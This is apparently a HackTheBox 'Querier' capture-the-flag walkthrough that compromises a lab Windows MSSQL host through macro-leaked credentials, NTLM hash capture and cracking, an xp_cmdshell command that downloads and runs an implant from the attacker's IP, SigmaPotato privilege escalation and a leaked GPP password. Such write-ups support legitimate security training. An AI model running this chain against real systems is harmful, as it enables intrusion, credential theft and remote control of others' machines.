---
title: Querier [Medium]
date: 2025-08-28
categories: [HackTheBox, OSEP]
tags: AD Windows
img_path: /assets/Images/HTB_Querier/logo.png
image:
  path: /assets/Images/HTB_Querier/logo.png
---

# Querier [Medium] OSEP

![Screenshot 2025-09-04 at 9.33.28 PM.png](/assets/Images/HTB_Querier/Screenshot_2025-09-04_at_9.33.28_PM.png)

## 🤨 Enumeration

```bash
nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.129.140.22
```

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.140.22:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-08-28T15:16:59+00:00; -4h35m29s from scanner time.
| ms-sql-info: 
|   10.129.140.22:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-28T15:12:50
| Not valid after:  2055-08-28T15:12:50
| MD5:   e34c:2fd9:f669:5bdd:3a9b:ac7c:7a67:69c1
|_SHA-1: 36fe:ca15:6444:c0db:14a2:4b62:bd08:79e7:4945:ab74
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-28T15:16:49
|_  start_date: N/A
|_clock-skew: mean: -4h35m30s, deviation: 1s, median: -4h35m30s

```

```bash
nxc smb $IP -u 'a' -p '' --shares
```

```bash
nxc smb $IP -u '' -p '' --shares
```

![image.png](/assets/Images/HTB_Querier/image.png)

Why netexec fails and smbclient works

1. `smbclient -N -L //10.129.140.22`

- Here you explicitly listed shares.
- Output shows:
    
    ```
    ADMIN$, C$, IPC$, Reports
    ```
    
    ✅ That means **the server allows anonymous (null session) access to enumerate shares**.
    
- But after listing, it tried to enumerate *workgroups* using **SMB1**, which is disabled (`SMBv1:False`), so you see:
    
    ```
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection failed
    ```
    
    This doesn’t affect the actual share list—it already showed you the shares.
    

---

2. `nxc smb $IP -u 'a' -p '' --shares`

- You tried with username `a` and empty password.
- This is **not a null session** anymore, it’s an **invalid user session**.
- Server denies → `Connection Error`

---

3. `nxc smb $IP -u '' -p ''`

- This **is** a null session.
- Output:
    
    ```
    [+] HTB.LOCAL\:
    ```
    
    Means **anonymous login succeeded**.
    

---

4. `nxc smb $IP -u '' -p '' --shares`

- You asked NXC to enumerate shares with null session.
- But unlike `smbclient`, **NXC (NetExec) tries to query share permissions too**.
- If anonymous can’t enumerate **share ACLs**, you get:
    
    ```
    Error enumerating shares: STATUS_ACCESS_DENIED
    ```
    

---

✅ **So the difference is:**

- `smbclient -N -L` just lists share names (lighter query → allowed).
- `nxc smb ... --shares` tries to get **detailed share info (permissions, access, etc.)**, which anonymous doesn’t have rights for → access denied.

i shares this error/bug to the Maintainer of NetExec i guess this will soon get fixed

![image.png](/assets/Images/HTB_Querier/image%201.png)

---

👉 You can still manually connect with `smbclient` to test access:

```bash
smbclient -N //10.129.140.22/Reports
```

![image.png](/assets/Images/HTB_Querier/image%202.png)

Using `smbclientng` to login 

```bash
smbclientng -u 'a' -p '' --host 10.129.140.22
```

![image.png](/assets/Images/HTB_Querier/image%203.png)

umm interesting `xlsm` file that `m` int he file is for macros

## 🔱 Initial Access

### XLSM Contain Macros

We can use a oletools to enumerate the file

```bash
python3 olevba.py ../../Currency\ Volume\ Report.xlsm
```

![sss.png](/assets/Images/HTB_Querier/sss.png)

![image.png](/assets/Images/HTB_Querier/image%204.png)

Got a Password which we can try it on mssql because that line gave us the hint where we have to use this password

Login using mssqlclient 

```bash
mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.129.140.22 -windows-auth
```

```bash
select user_name();

select * from fn_my_permissions(NULL, 'SEREVR');
```

![image.png](/assets/Images/HTB_Querier/image%205.png)

There is a volume database which was also mentioned in the macros code

```bash
select name from master.sys.databeses;
```

![image.png](/assets/Images/HTB_Querier/image%206.png)

Got nothing

### NTLM relay

But but we can already try to get a NTLMv2 hash using `xp_dirtree` 

```bash
responder -I tun0
```

```bash
xp_dirtree \\10.10.14.109\share
```

![image.png](/assets/Images/HTB_Querier/image%207.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.129.140.22
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:605fa95efd333468:3F407D57275694E7E71AB1705AF2C88A:0101000000000000004F2A9D9D18DC0155652402F31169B80000000002000800350043005900410001001E00570049004E002D0050005A0058004C0057004300310037005A005200350004003400570049004E002D0050005A0058004C0057004300310037005A00520035002E0035004300590041002E004C004F00430041004C000300140035004300590041002E004C004F00430041004C000500140035004300590041002E004C004F00430041004C0007000800004F2A9D9D18DC0106000400020000000800300030000000000000000000000000300000D1FDA9BE2D28DCE68E7E492803D9B85D5A035ABC2E6FCAA45B62AF0DEFA9847A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310030003900000000000000000000000000
```

Cracked it via hashcat

```bash
hashcat -m 5600 mssql-svc_NTLMV2 /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/Images/HTB_Querier/image%208.png)

Login with the mssql-svc account

```bash
mssqlclient.py mssql-svc:'corporate568'@10.129.140.22 -windows-auth
```

```bash
select * from fn_my_permissions(NULL, 'SERVER');
```

We have alot of permissions

![image.png](/assets/Images/HTB_Querier/image%209.png)

Before using xp_cmdshell enable it 

Getting a sliver session 

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "powershell -c iwr http://10.10.14.109/shell.exe -OutFile C:\Windows\Temp\shell.exe"
output   
------   
NULL     

SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "C:\Windows\Temp\shell.exe"
output   
------   
NULL
```

![image.png](/assets/Images/HTB_Querier/image%2010.png)

Got the session as `mssql-svc` user

![image.png](/assets/Images/HTB_Querier/image%2011.png)

## 💀 Priv Esc

### SeImpersonatePrivilege

Checking the Privileges of this user as its command we see mssql user have `SeImpersonatePrivilege`

```bash
execute -o cmd.exe /c whoami /priv
```

![image.png](/assets/Images/HTB_Querier/image%2012.png)

`getsystem` from sliver did’nt worked !

We are using SigmaPotato for Impersonating Client `NT AUTHORITY`

```bash
.\SigmaPotato.exe C:\Windows\Temp\shell.exe
```

![image.png](/assets/Images/HTB_Querier/image%2013.png)

Getting Administrator Flag

```bash
execute -o cmd.exe /c type 'C:\Users\Administrator\Desktop\root.txt'
```

## Beyond Administator

### Password Leak from Group Policy Preferences

There was one more way to get administrator

if you just run `PowerUp.ps1`

The **administrator password** showed up because of **Group Policy Preferences (GPP)**.

- In older Windows/AD environments, admins sometimes used **`GPP`** to automatically create or manage local user accounts (like adding “Administrator” with a specific password) across many machines.
- These settings got stored in **XML files** under:
- The problem: GPP stored **passwords in XML in cleartext or weakly encrypted (CPassword field)**. Microsoft published the AES key years ago, so attackers can decrypt it easily.
- In the output, the `Groups.xml` file contained the cached **local Administrator password**:

```bash
PS C:\Tools> Invoke-AllChecks

Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2212
ProcessId   : 192
Name        : 192
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Login using evil-winrm

```bash
evil-winrm -i $IP -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'
```

---

### `Author : PaiN`